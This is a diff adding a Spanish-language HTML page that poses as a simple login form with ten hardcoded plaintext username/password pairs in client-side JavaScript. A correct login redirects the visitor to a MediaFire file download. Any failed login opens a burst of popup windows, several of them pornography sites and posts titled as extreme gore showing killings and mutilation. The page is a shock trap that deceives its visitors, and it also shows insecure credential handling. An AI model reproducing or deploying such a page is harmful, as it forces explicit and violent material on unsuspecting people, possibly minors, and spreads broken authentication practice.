@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Bienvenido mi fan</title>
+</head>
+<body>
+  <h1>Bienvenido mi fan</h1>
+  
+  <form onsubmit="return verificarCredenciales()">
+    <label for="usuario">Usuario:</label>
+    <input type="text" id="usuario" required><br><br>
+    
+    <label for="contrasena">Contraseña:</label>
+    <input type="password" id="contrasena" required><br><br>
+    
+    <input type="submit" value="Iniciar sesión">
+  </form>
+
+  <script>
+    function verificarCredenciales() {
+      // Obtener los valores ingresados por el usuario
+      var usuario = document.getElementById('usuario').value;
+      var contrasena = document.getElementById('contrasena').value;
+      
+      // Verificar las credenciales
+      var usuarios = {
+        "usuario1": "contrasena1",
+        "usuario2": "contrasena2",
+        "usuario3": "contrasena3",
+        "usuario4": "contrasena4",
+        "usuario5": "contrasena5",
+        "usuario6": "contrasena6",
+        "usuario7": "contrasena7",
+        "usuario8": "contrasena8",
+        "usuario9": "contrasena9",
+        "usuario10": "contrasena10"
+      };
+      
+      if (usuarios[usuario] === contrasena) {
+        alert("¡Inicio de sesión exitoso!");
+        window.location.href = "https://www.mediafire.com/file/nummwsvo7ee7csm/a+(1).jpeg/file";
+        return false; // Evitar el envío del formulario
+      } else {
+        alert("Error. Intenta con esta 222djdns.");
+        window.open("https://www.youtube.com/watch?v=Z7SMGK5xewc");
+        window.open("https://www.xnxx.com/video-11o9dj87/bienvenido_al_extrano_mundo_de_los_enanos_pervertidos");
+        window.open("https://www.youtube.com/watch?v=YlOP2Mr82J8");
+        window.open("https://pomf2.lain.la/f/63jtyer.mp4");
+        window.open("https://scrolller.com/video-nsfw-gore-two-women-are-brutally-bricked-to-8pmjwrqrmu");
+        window.open("https://www.reddit.com/r/eyeblech/comments/pycm6h/videonsfwextreme_gore_young_man_has_his_neck_cut/");
+        window.open("https://www.reddit.com/r/eyeblech/comments/q9q8va/videonsfwextreme_gore_criminal_gang_captures/");
+        window.open("https://www.youtube.com/watch?v=2NgkofPkj8k");
+        window.open("https://www.youtube.com/watch?v=PCOG2vyfcAA");
+        window.open("https://www.youtube.com/watch?v=49PXlHQ5yps");
+        window.open("https://www.youtube.com/watch?v=mn4vL5l7mUE");
+        window.open("https://www.youtube.com/watch?v=V7IIDLKUG_0");
+        window.open("https://www.youtube.com/watch?v=ns1SGo3WCF4");
+        window.open("https://www.youtube.com/watch?v=isdrUOPzyN4&list=PLD6llDYTAHUm1Hl-XmKz1O0a06lZDlI7y&index=2");
+        window.open("https://www.youtube.com/watch?v=6VMRAGxjOoA");
+        window.open("https://es.pornhub.com/view_video.php?viewkey=ph63b44f04e5f58");
+        window.open("");
+        return false; // Evitar el envío del formulario
+      }
+    }
+  </script>
+</body>
+</html>
